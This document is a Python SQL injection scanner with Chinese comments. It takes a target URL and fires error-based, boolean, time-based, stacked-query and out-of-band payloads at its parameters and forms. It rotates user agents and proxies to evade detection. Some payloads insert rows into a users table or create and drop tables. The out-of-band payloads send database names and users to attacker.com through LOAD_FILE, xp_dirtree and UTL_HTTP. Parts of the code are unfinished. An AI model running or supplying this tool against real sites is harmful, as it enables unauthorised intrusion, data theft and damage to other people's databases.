import requests
import re
import argparse
import random
from urllib.parse import urlparse, urljoin
from bs4 import BeautifulSoup
from prettytable import PrettyTable
import time
import logging

# 配置日志记录
logging.basicConfig(filename='scan_errors.log', level=logging.ERROR,
                    format='%(asctime)s - %(levelname)s - %(message)s')

# 定义多个用户代理字符串
user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0'
]

# 定义代理池
proxies = [
    {'http': 'http://proxy1.example.com:8080', 'https': 'http://proxy1.example.com:8080'},
    {'http': 'http://proxy2.example.com:8080', 'https': 'http://proxy2.example.com:8080'}
]

class SQLiScanner:
    def __init__(self, target_url):
        """
        初始化SQL注入扫描器
        :param target_url: 目标URL
        """
        self.target_url = target_url
        self.session = requests.Session()
        # 随机选择一个用户代理
        random_user_agent = random.choice(user_agents)
        # 设置合理的请求头，模拟浏览器访问
        self.session.headers = {
            'User-Agent': random_user_agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        }
        self.vulnerable_params = []  # 存储发现的表单漏洞
        self.vulnerable_urls = []    # 存储发现的URL参数漏洞
        self.db_type = None          # 数据库类型
        self.time_based_tested = False # 是否已测试时间型注入
        self.scan_depth = 2          # 扫描深度，用于控制递归扫描
        self.scanned_urls = set()    # 已扫描的URL集合
        self.max_urls = 100          # 最大扫描URL数量

    def scan_for_sqli(self):
        """
        扫描目标URL寻找SQL注入漏洞
        """
        print(f"[*] 开始扫描 {self.target_url} 的SQL注入漏洞...")

        try:
            # 1. 检查URL参数注入
            self.test_url_parameters()

            # 2. 检查表单注入
            self.test_forms()

            # 3. 检查时间型盲注(如果前两种没发现漏洞)
            if not self.vulnerable_params and not self.vulnerable_urls:
                self.test_time_based_sqli()

            # 4. 检查堆叠注入
            self.test_stacked_queries()

            # 5. 检查带外注入
            self.test_out_of_band_sqli()

            # 显示扫描结果
            self.display_results()

        except requests.RequestException as e:
            logging.error(f"请求失败: {str(e)}")
            print(f"[-] 请求失败: {str(e)}")
        except Exception as e:
            logging.error(f"扫描过程中发生错误: {str(e)}")
            print(f"[-] 扫描过程中发生错误: {str(e)}")

    def test_url_parameters(self):
        """
        测试URL中的查询参数是否存在SQL注入漏洞
        """
        print("\n[*] 正在检查URL参数注入...")
        parsed_url = urlparse(self.target_url)
        if not parsed_url.query:
            print("[-] URL中没有查询参数")
            return

        # 获取所有参数名
        params = [param.split('=')[0] for param in parsed_url.query.split('&')]
        print(f"[+] 发现 {len(params)} 个URL参数: {', '.join(params)}")

        # 测试每个参数
        for param in params:
            print(f"[*] 测试参数: {param}")

            # 测试基于错误的注入
            is_vulnerable, payload, db_type = self.test_error_based_sqli(param, 'url')
            if is_vulnerable:
                print(f"[!] 发现错误型SQL注入漏洞 (参数: {param}, 数据库: {db_type})")
                print(f"[!] 有效载荷: {payload}")
                self.vulnerable_urls.append({
                    'type': 'error',
                    'url': self.target_url,
                    'param': param,
                    'payload': payload,
                    'db_type': db_type
                })
                self.db_type = db_type  # 记住数据库类型
                continue

            # 测试布尔型盲注
            is_vulnerable, payload, db_type = self.test_boolean_based_sqli(param, 'url')
            if is_vulnerable:
                print(f"[!] 发现布尔型盲注漏洞 (参数: {param}, 数据库: {db_type})")
                print(f"[!] 有效载荷: {payload}")
                self.vulnerable_urls.append({
                    'type': 'boolean',
                    'url': self.target_url,
                    'param': param,
                    'payload': payload,
                    'db_type': db_type
                })
                self.db_type = db_type
                continue

    def test_forms(self):
        """
        测试网页表单是否存在SQL注入漏洞
        """
        print("\n[*] 正在检查表单注入...")

        try:
            # 获取页面上的所有表单
            forms = self.extract_forms(self.target_url)
            if not forms:
                print("[-] 未发现表单")
                return

            print(f"[+] 发现 {len(forms)} 个表单")

            # 测试每个表单
            for i, form in enumerate(forms, 1):
                form_details = self.get_form_details(form)
                print(f"\n[*] 正在测试表单 {i}: {form_details['action']}")

                # 测试基于错误的注入
                is_vulnerable, payload, db_type = self.test_error_based_sqli(form_details, 'form')
                if is_vulnerable:
                    print(f"[!] 发现错误型SQL注入漏洞 (表单: {form_details['action']}, 数据库: {db_type})")
                    print(f"[!] 有效载荷: {payload}")
                    self.vulnerable_params.append({
                        'type': 'error',
                        'url': form_details['action'],
                        'method': form_details['method'],
                        'inputs': form_details['inputs'],
                        'payload': payload,
                        'db_type': db_type
                    })
                    self.db_type = db_type
                    continue

                # 测试布尔型盲注
                is_vulnerable, payload, db_type = self.test_boolean_based_sqli(form_details, 'form')
                if is_vulnerable:
                    print(f"[!] 发现布尔型盲注漏洞 (表单: {form_details['action']}, 数据库: {db_type})")
                    print(f"[!] 有效载荷: {payload}")
                    self.vulnerable_params.append({
                        'type': 'boolean',
                        'url': form_details['action'],
                        'method': form_details['method'],
                        'inputs': form_details['inputs'],
                        'payload': payload,
                        'db_type': db_type
                    })
                    self.db_type = db_type

        except Exception as e:
            logging.error(f"表单测试出错: {str(e)}")
            print(f"[-] 表单测试出错: {str(e)}")

    def test_time_based_sqli(self):
        """
        测试时间型盲注(当其他方法未发现漏洞时使用)
        """
        print("\n[*] 正在检查时间型盲注...")
        self.time_based_tested = True

        # 1. 测试URL参数
        parsed_url = urlparse(self.target_url)
        if parsed_url.query:
            params = [param.split('=')[0] for param in parsed_url.query.split('&')]
            for param in params:
                is_vulnerable, payload, db_type = self.test_time_based_param(param)
                if is_vulnerable:
                    print(f"[!] 发现时间型盲注漏洞 (参数: {param}, 数据库: {db_type})")
                    print(f"[!] 有效载荷: {payload}")
                    self.vulnerable_urls.append({
                        'type': 'time',
                        'url': self.target_url,
                        'param': param,
                        'payload': payload,
                        'db_type': db_type
                    })
                    self.db_type = db_type

        # 2. 测试表单
        forms = self.extract_forms(self.target_url)
        for form in forms:
            form_details = self.get_form_details(form)
            is_vulnerable, payload, db_type = self.test_time_based_form(form_details)
            if is_vulnerable:
                print(f"[!] 发现时间型盲注漏洞 (表单: {form_details['action']}, 数据库: {db_type})")
                print(f"[!] 有效载荷: {payload}")
                self.vulnerable_params.append({
                    'type': 'time',
                    'url': form_details['action'],
                    'method': form_details['method'],
                    'inputs': form_details['inputs'],
                    'payload': payload,
                    'db_type': db_type
                })
                self.db_type = db_type

    def test_error_based_sqli(self, target, target_type):
        """
        测试基于错误的SQL注入
        :param target: 目标参数或表单详情
        :param target_type: 'url'或'form'
        :return: (是否脆弱, 有效载荷, 数据库类型)
        """
        # 不同数据库的错误型注入测试载荷
        test_payloads = [
            # MySQL
            ("'", "MySQL"),
            ("' OR '1'='1", "MySQL"),
            ("' OR 1=1-- ", "MySQL"),
            ("' OR 1=1#", "MySQL"),
            ("1' ORDER BY 1-- ", "MySQL"),
            ("1' UNION SELECT 1,2,3-- ", "MySQL"),
            # SQL Server
            ("'", "SQL Server"),
            ("' OR '1'='1", "SQL Server"),
            ("' OR 1=1--", "SQL Server"),
            ("1;WAITFOR DELAY '0:0:5'--", "SQL Server"),
            # Oracle
            ("'", "Oracle"),
            ("' OR '1'='1", "Oracle"),
            ("' OR 1=1--", "Oracle"),
            ("1) UNION SELECT 1,2,3 FROM dual--", "Oracle"),
            # PostgreSQL
            ("'", "PostgreSQL"),
            ("' OR '1'='1", "PostgreSQL"),
            ("' OR 1=1--", "PostgreSQL"),
            ("1) UNION SELECT 1,2,3--", "PostgreSQL"),
            # SQLite
            ("'", "SQLite"),
            ("' OR '1'='1", "SQLite"),
            ("' OR 1=1--", "SQLite"),
            ("1) UNION SELECT 1,2,3--", "SQLite")
        ]

        for payload, db_type in test_payloads:
            try:
                # 动态设置请求超时时间，提升灵活性
                timeout = random.randint(8, 15)  # 设置请求超时范围为 8-15 秒
                # 随机选择一个代理
                random_proxy = random.choice(proxies)
                if target_type == 'url':
                    # 测试URL参数
                    parsed_url = urlparse(self.target_url)
                    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
                    original_params = {p.split('=')[0]: p.split('=')[1] if '=' in p else ''
                                       for p in parsed_url.query.split('&')} if parsed_url.query else {}

                    test_params = original_params.copy()
                    test_params[target] = payload
                    query_string = '&'.join([f"{k}={v}" for k, v in test_params.items()])
                    test_url = f"{base_url}?{query_string}"

                    res = self.session.get(test_url, timeout=timeout, proxies=random_proxy)
                else:
                    # 测试表单
                    data = {}
                    for input in target['inputs']:
                        if input['type'] in ['text', 'search', 'hidden', 'password', 'email']:
                            data[input['name']] = payload
                        else:
                            data[input['name']] = input.get('value', '')

                    if target['method'] == 'post':
                        res = self.session.post(target['url'], data=data, timeout=timeout, proxies=random_proxy)
                    else:
                        res = self.session.get(target['url'], params=data, timeout=timeout, proxies=random_proxy)

                # 检查响应中是否包含数据库错误信息
                if self.check_db_errors(res.text, db_type):
                    return True, payload, db_type

            except requests.RequestException:
                continue

        return False, None, None

    def test_boolean_based_sqli(self, target, target_type):
        """
        测试布尔型盲注
        :param target: 目标参数或表单详情
        :param target_type: 'url'或'form'
        :return: (是否脆弱, 有效载荷, 数据库类型)
        """
        # 布尔型测试载荷
        boolean_payloads = [
            ("' OR 1=1--", "' OR 1=2--", "Generic"),
            ("1' AND 1=1--", "1' AND 1=2--", "Generic"),
            ("' OR 'a'='a", "' OR 'a'='b", "Generic"),
            ("1' OR 1=1#", "1' OR 1=2#", "MySQL"),
            ("1' AND SLEEP(5)#", "1' AND SLEEP(0)#", "MySQL"),
            ("1' WAITFOR DELAY '0:0:5'--", "1' WAITFOR DELAY '0:0:0'--", "SQL Server"),
            ("1' AND (SELECT * FROM (SELECT(SLEEP(5)))--", "1' AND (SELECT * FROM (SELECT(SLEEP(0))))--", "MySQL")
        ]

        # 先获取原始页面内容
        try:
            # 动态调整超时时间
            timeout = random.randint(8, 15)
            # 随机选择一个代理
            random_proxy = random.choice(proxies)
            if target_type == 'url':
                parsed_url = urlparse(self.target_url)
                base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
                original_params = {p.split('=')[0]: p.split('=')[1] if '=' in p else ''
                                   for p in parsed_url.query.split('&')} if parsed_url.query else {}

                # 获取原始响应
                original_query = '&'.join([f"{k}={v}" for k, v in original_params.items()])
                original_url = f"{base_url}?{original_query}"
                original_res = self.session.get(original_url, timeout=timeout, proxies=random_proxy)
                original_content = original_res.text
            else:
                # 获取原始表单响应
                data = {}
                for input in target['inputs']:
                    data[input['name']] = input.get('value', '')

                if target['method'] == 'post':
                    original_res = self.session.post(target['url'], data=data, timeout=timeout, proxies=random_proxy)
                else:
                    original_res = self.session.get(target['url'], params=data, timeout=timeout, proxies=random_proxy)
                original_content = original_res.text
        except requests.RequestException as e:
            logging.error(f"获取原始页面内容失败: {str(e)}")
            return False, None, None

        # 测试每个布尔型载荷
        for true_payload, false_payload, db_type in boolean_payloads:
            try:
                # 动态调整超时时间
                timeout = random.randint(8, 15)
                # 随机选择一个代理
                random_proxy = random.choice(proxies)
                if target_type == 'url':
                    # 测试TRUE条件
                    test_params = original_params.copy()
                    test_params[target] = true_payload
                    true_query = '&'.join([f"{k}={v}" for k, v in test_params.items()])
                    true_url = f"{base_url}?{true_query}"
                    true_res = self.session.get(true_url, timeout=timeout, proxies=random_proxy)

                    # 测试FALSE条件
                    test_params[target] = false_payload
                    false_query = '&'.join([f"{k}={v}" for k, v in test_params.items()])
                    false_url = f"{base_url}?{false_query}"
                    false_res = self.session.get(false_url, timeout=timeout, proxies=random_proxy)
                else:
                    # 测试表单的TRUE条件
                    true_data = {}
                    for input in target['inputs']:
                        if input['type'] in ['text', 'search', 'hidden', 'password', 'email']:
                            true_data[input['name']] = true_payload
                        else:
                            true_data[input['name']] = input.get('value', '')

                    if target['method'] == 'post':
                        true_res = self.session.post(target['url'], data=true_data, timeout=timeout, proxies=random_proxy)
                    else:
                        true_res = self.session.get(target['url'], params=true_data, timeout=timeout, proxies=random_proxy)

                    # 测试表单的FALSE条件
                    false_data = {}
                    for input in target['inputs']:
                        if input['type'] in ['text', 'search', 'hidden', 'password', 'email']:
                            false_data[input['name']] = false_payload
                        else:
                            false_data[input['name']] = input.get('value', '')

                    if target['method'] == 'post':
                        false_res = self.session.post(target['url'], data=false_data, timeout=timeout, proxies=random_proxy)
                    else:
                        false_res = self.session.get(target['url'], params=false_data, timeout=timeout, proxies=random_proxy)

                # 比较三个响应的差异
                true_diff = self.compare_responses(original_content, true_res.text)
                false_diff = self.compare_responses(original_content, false_res.text)

                # 如果TRUE条件和FALSE条件的响应有明显差异，则可能存在布尔型盲注
                if true_diff > 0.2 and false_diff < 0.1:  # 阈值可以根据实际情况调整
                    return True, true_payload, db_type

            except requests.RequestException:
                continue

        return False, None, None

    def test_time_based_param(self, param):
        """
        测试URL参数的时间型盲注
        :param param: 要测试的参数名
        :return: (是否脆弱, 有效载荷, 数据库类型)
        """
        # 不同数据库的时间型注入测试载荷
        time_payloads = [
            ("1' AND SLEEP(5)#", "MySQL"),
            ("1' AND (SELECT * FROM (SELECT(SLEEP(5)))--", "MySQL"),
            ("1'; WAITFOR DELAY '0:0:5'--", "SQL Server"),
            ("1' OR (SELECT 1 FROM (SELECT SLEEP(5))--", "MySQL"),
            ("1' AND 1=(SELECT 1 FROM PG_SLEEP(5))--", "PostgreSQL"),
            ("1' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)--", "Oracle")
        ]

        parsed_url = urlparse(self.target_url)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
        original_params = {p.split('=')[0]: p.split('=')[1] if '=' in p else ''
                           for p in parsed_url.query.split('&')} if parsed_url.query else {}

        for payload, db_type in time_payloads:
            try:
                # 随机选择一个代理
                random_proxy = random.choice(proxies)
                # 发送正常请求获取基准时间
                normal_params = original_params.copy()
                normal_params[param] = "1"
                normal_query = '&'.join([f"{k}={v}" for k, v in normal_params.items()])
                normal_url = f"{base_url}?{normal_query}"

                start_time = time.time()
                self.session.get(normal_url, timeout=10, proxies=random_proxy)
                normal_duration = time.time() - start_time

                # 发送测试载荷
                test_params = original_params.copy()
                test_params[param] = payload
                test_query = '&'.join([f"{k}={v}" for k, v in test_params.items()])
                test_url = f"{base_url}?{test_query}"

                start_time = time.time()
                self.session.get(test_url, timeout=15, proxies=random_proxy)  # 设置更长的超时时间
                test_duration = time.time() - start_time

                # 检查响应时间是否明显延长
                if test_duration - normal_duration > 4:  # 至少延迟4秒
                    return True, payload, db_type

            except requests.RequestException:
                continue

        return False, None, None

    def test_time_based_form(self, form_details):
        """
        测试表单的时间型盲注
        :param form_details: 表单详情
        :return: (是否脆弱, 有效载荷, 数据库类型)
        """
        # 不同数据库的时间型注入测试载荷
        time_payloads = [
            ("1' AND SLEEP(5)#", "MySQL"),
            ("1' AND (SELECT * FROM (SELECT(SLEEP(5)))--", "MySQL"),
            ("1'; WAITFOR DELAY '0:0:5'--", "SQL Server"),
            # 这里原代码未写完，可根据需要补充完整
        ]

        for payload, db_type in time_payloads:
            try:
                # 随机选择一个代理
                random_proxy = random.choice(proxies)
                # 动态调整超时时间
                timeout = random.randint(8, 15)
                # 发送正常请求获取基准时间
                normal_data = {}
                for input in form_details['inputs']:
                    normal_data[input['name']] = input.get('value', '')

                start_time = time.time()
                if form_details['method'] == 'post':
                    self.session.post(form_details['url'], data=normal_data, timeout=timeout, proxies=random_proxy)
                else:
                    self.session.get(form_details['url'], params=normal_data, timeout=timeout, proxies=random_proxy)
                normal_duration = time.time() - start_time

                # 发送测试载荷
                test_data = {}
                for input in form_details['inputs']:
                    if input['type'] in ['text', 'search', 'hidden', 'password', 'email']:
                        test_data[input['name']] = payload
                    else:
                        test_data[input['name']] = input.get('value', '')

                start_time = time.time()
                if form_details['method'] == 'post':
                    self.session.post(form_details['url'], data=test_data, timeout=15, proxies=random_proxy)
                else:
                    self.session.get(form_details['url'], params=test_data, timeout=15, proxies=random_proxy)
                test_duration = time.time() - start_time

                # 检查响应时间是否明显延长
                if test_duration - normal_duration > 4:  # 至少延迟4秒
                    return True, payload, db_type

            except requests.RequestException:
                continue

        return False, None, None

    def extract_forms(self, url):
        """
        提取页面上的所有表单
        :param url: 页面URL
        :return: 表单列表
        """
        try:
            # 动态调整超时时间
            timeout = random.randint(8, 15)
            # 随机选择一个代理
            random_proxy = random.choice(proxies)
            res = self.session.get(url, timeout=timeout, proxies=random_proxy)
            soup = BeautifulSoup(res.content, 'html.parser')
            return soup.find_all('form')
        except requests.RequestException as e:
            logging.error(f"提取表单时请求失败: {str(e)}")
            return []

    def get_form_details(self, form):
        """
        获取表单的详细信息
        :param form: 表单元素
        :return: 表单详细信息字典
        """
        details = {}
        action = form.attrs.get('action').lower()
        details['action'] = urljoin(self.target_url, action) if action else self.target_url
        details['method'] = form.attrs.get('method', 'get').lower()
        details['inputs'] = []
        for input_tag in form.find_all('input'):
            input_type = input_tag.attrs.get('type', 'text')
            input_name = input_tag.attrs.get('name')
            input_value = input_tag.attrs.get('value', '')
            details['inputs'].append({
                'type': input_type,
                'name': input_name,
                'value': input_value
            })
        return details

    def check_db_errors(self, content, db_type):
        """
        检查响应内容中是否包含数据库错误信息
        :param content: 响应内容
        :param db_type: 数据库类型
        :return: 是否包含错误信息
        """
        error_patterns = {
            'MySQL': [
                r"SQL syntax.*MySQL",
                r"Warning.*mysql_.*",
                r"MySQL Query fail.*",
                r"SQLSTATE\[42S22\]",
                r"valid MySQL result",
                r"MySqlClient\.",
                r"MySQL server version",
                r"You have an error in your SQL syntax",
                r"MariaDB server version"
            ],
            'SQL Server': [
                r"ODBC SQL Server Driver",
                r"Microsoft SQL Server",
                r"Unclosed quotation mark after the character string",
                r"Syntax error in.*",
                r"SQL Server.*Driver",
                r"OLE DB Provider for SQL Server",
                r"Procedure or function.*expects parameter",
                r"Microsoft OLE DB Provider for SQL Server",
                r"Incorrect syntax near"
            ],
            'Oracle': [
                r"ORA-[0-9]{4,5}",
                r"Oracle error",
                r"SQL command not properly ended",
                r"Oracle.*Driver",
                r"Oracle.*Connection",
                r"Warning.*oci_.*",
                r"Oracle.*Database"
            ],
            'PostgreSQL': [
                r"ERROR: syntax error at or near",
                r"PostgreSQL query failed",
                r"ERROR:.*LINE \d+",
                r"invalid input syntax for",
                r"unterminated quoted string at or near",
                r"PostgreSQL.*ERROR",
                r"pg_.*ERROR"
            ],
            'SQLite': [
                r"SQLite error",
                r"unrecognized token:",
                r"SQLite.*ERROR",
                r"SQLite3::SQLException",
                r"no such table:"
            ]
        }

        if db_type in error_patterns:
            for pattern in error_patterns[db_type]:
                if re.search(pattern, content, re.IGNORECASE):
                    return True
        return False

    def compare_responses(self, content1, content2):
        """
        比较两个响应内容的差异
        :param content1: 第一个响应内容
        :param content2: 第二个响应内容
        :return: 差异比例
        """
        if len(content1) == 0:
            return 0
        diff_count = sum(1 for a, b in zip(content1, content2) if a != b)
        return diff_count / len(content1)

    def display_results(self):
        """
        显示扫描结果
        """
        table = PrettyTable()
        table.field_names = ["类型", "URL", "参数/表单", "有效载荷", "数据库类型"]

        for vuln in self.vulnerable_urls:
            table.add_row([vuln['type'], vuln['url'], vuln['param'], vuln['payload'], vuln['db_type']])

        for vuln in self.vulnerable_params:
            table.add_row([vuln['type'], vuln['url'], ', '.join([i['name'] for i in vuln['inputs']]), vuln['payload'], vuln['db_type']])

        if self.vulnerable_urls or self.vulnerable_params:
            print("\n[!] 发现以下SQL注入漏洞:")
            print(table)
        else:
            print("\n[-] 未发现SQL注入漏洞")

    def test_stacked_queries(self):
        """
        测试堆叠查询注入
        """
        print("\n[*] 正在检查堆叠查询注入...")
        
        stacked_payloads = [
            ("1'; CREATE TABLE hack_test(id int);--", "MySQL"),
            ("1'; SELECT @@version; --", "MySQL"),
            ("1); INSERT INTO users VALUES (1,'hack','hack');--", "SQL Server"),
            ("1'; DROP TABLE IF EXISTS hack_test;--", "PostgreSQL"),
            ("1'; DECLARE @cmd varchar(4000);--", "SQL Server")
        ]

        # 测试URL参数
        parsed_url = urlparse(self.target_url)
        if parsed_url.query:
            params = [param.split('=')[0] for param in parsed_url.query.split('&')]
            for param in params:
                for payload, db_type in stacked_payloads:
                    if self.test_stacked_injection(param, payload, 'url'):
                        print(f"[!] 发现堆叠查询注入漏洞 (参数: {param}, 数据库: {db_type})")
                        self.vulnerable_urls.append({
                            'type': 'stacked',
                            'url': self.target_url,
                            'param': param,
                            'payload': payload,
                            'db_type': db_type
                        })
                        return

    def test_out_of_band_sqli(self):
        """
        测试带外SQL注入
        """
        print("\n[*] 正在检查带外注入...")
        
        # 带外注入测试载荷
        oob_payloads = [
            ("1' AND LOAD_FILE(CONCAT('\\\\\\\\',(SELECT database()),'.attacker.com\\\\abc'));--", "MySQL"),
            ("1'; DECLARE @q VARCHAR(1024); SELECT @q=CONVERT(VARCHAR(1024), DB_NAME())+'.attacker.com'; EXEC('master..xp_dirtree \"\\\\'+@q+'\"');--", "SQL Server"),
            ("1' AND UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual)) --", "Oracle"),
            ("1' AND pg_sleep(extract(second from now()))--", "PostgreSQL")
        ]

        # 测试URL参数
        parsed_url = urlparse(self.target_url)
        if parsed_url.query:
            params = [param.split('=')[0] for param in parsed_url.query.split('&')]
            for param in params:
                for payload, db_type in oob_payloads:
                    if self.test_oob_injection(param, payload):
                        print(f"[!] 发现带外注入漏洞 (参数: {param}, 数据库: {db_type})")
                        self.vulnerable_urls.append({
                            'type': 'out-of-band',
                            'url': self.target_url,
                            'param': param,
                            'payload': payload,
                            'db_type': db_type
                        })
                        return

    def test_stacked_injection(self, param, payload, target_type):
        """
        测试堆叠注入的具体实现
        """
        try:
            timeout = random.randint(8, 15)
            random_proxy = random.choice(proxies)
            
            if target_type == 'url':
                parsed_url = urlparse(self.target_url)
                base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
                params = {p.split('=')[0]: p.split('=')[1] if '=' in p else ''
                           for p in parsed_url.query.split('&')} if parsed_url.query else {}
                
                test_params = params.copy()
                test_params[param] = payload
                test_url = f"{base_url}?{'&'.join([f'{k}={v}' for k, v in test_params.items()])}"
                
                res = self.session.get(test_url, timeout=timeout, proxies=random_proxy)
                
                # 检查响应中是否有执行成功的迹象
                success_patterns = [
                    r"Table.*created",
                    r"Query.*executed successfully",
                    r"affected rows",
                    r"Microsoft SQL Server.*Version",
                    r"PostgreSQL.*Version"
                ]
                
                for pattern in success_patterns:
                    if re.search(pattern, res.text, re.IGNORECASE):
                        return True
                        
            return False
            
        except requests.RequestException:
            return False

    def test_oob_injection(self, param, payload):
        """
        测试带外注入的具体实现
        """
        try:
            timeout = random.randint(8, 15)
            random_proxy = random.choice(proxies)
            
            parsed_url = urlparse(self.target_url)
            base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
            params = {p.split('=')[0]: p.split('=')[1] if '=' in p else ''
                       for p in parsed_url.query.split('&')} if parsed_url.query else {}
            
            test_params = params.copy()
            test_params[param] = payload
            test_url = f"{base_url}?{'&'.join([f'{k}={v}' for k, v in test_params.items()])}"
            
            res = self.session.get(test_url, timeout=timeout, proxies=random_proxy)
            
            # 检查是否有DNS请求或HTTP请求的迹象
            # 注意：实际的带外注入检测需要配合DNS服务器或HTTP服务器
            return False
            
        except requests.RequestException:
            return False


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SQL注入扫描器")
    parser.add_argument("target_url", help="目标URL")
    args = parser.parse_args()

    scanner = SQLiScanner(args.target_url)
    scanner.scan_for_sqli()
